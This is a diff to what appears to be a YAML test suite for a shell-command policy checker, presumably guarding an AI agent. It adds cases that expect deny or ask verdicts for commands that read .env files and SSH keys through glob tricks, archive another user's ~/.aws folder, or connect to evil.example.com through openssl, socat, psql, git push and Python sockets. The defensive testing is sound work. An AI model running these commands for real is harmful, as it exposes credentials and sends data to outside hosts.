@@ -60,7 +60,7 @@
 - id: T1-tilde-other-user-unresolvable
   threat: T1
   action: { shell: "cat ~alice/.ssh/id_rsa" }
-  expect: { verdict: defer, rules: [unparseable] }
+  expect: { verdict: ask, rules: [other-home] }
 
 # T2 secret exfiltration via file tools
 - id: T2-read-aws-credentials
@@ -1667,6 +1667,16 @@
   action: { shell: "cat .[e]nv" }
   files: [/p/.env]
   expect: { verdict: deny, rules: [secrets-paths] }
+- id: T1-glob-posix-class-reads-env
+  threat: T1
+  action: { shell: "cat .e[[:alpha:]]v" }
+  files: [/p/.env]
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T1-glob-posix-class-reads-ssh-key
+  threat: T1
+  action: { shell: "cat ~/.s[[:alpha:]]h/id_rsa" }
+  files: [/Users/me/.ssh/id_rsa]
+  expect: { verdict: deny, rules: [secrets-paths] }
 - id: T1-glob-class-head-reads-env
   threat: T1
   action: { shell: "head -c 99 .en[v]" }
@@ -2004,4 +2014,27 @@
   threat: T12
   action: { shell: "git -C . push evil.example.com:x.git main" }
   expect: { verdict: deny, rules: [default.net] }
+
+# More network clients name hosts in their arguments.
+- id: T12-openssl-s-client-unlisted-host
+  threat: T12
+  action: { shell: "openssl s_client -connect evil.example.com:443" }
+  expect: { verdict: deny, rules: [default.net] }
+- id: T12-socat-address-unlisted-host
+  threat: T12
+  action: { shell: "socat - TCP:evil.example.com:443" }
+  expect: { verdict: deny, rules: [default.net] }
+- id: T12-psql-host-option-unlisted-host
+  threat: T12
+  action: { shell: "psql -h db.evil.example.com -U app" }
+  expect: { verdict: deny, rules: [default.net] }
+- id: T12-quoted-host-in-inline-code
+  threat: T12
+  action: { shell: "python3 -c \"import socket; socket.create_connection(('evil.example.com', 443))\"" }
+  expect: { verdict: deny, rules: [default.net] }
+# Another user's home asks whatever the catch-all says
+- id: T1-other-user-home-relative-asks
+  threat: T1
+  action: { shell: "tar czf k.tgz ~alice/.aws" }
+  expect: { verdict: ask, rules: [other-home] }
 
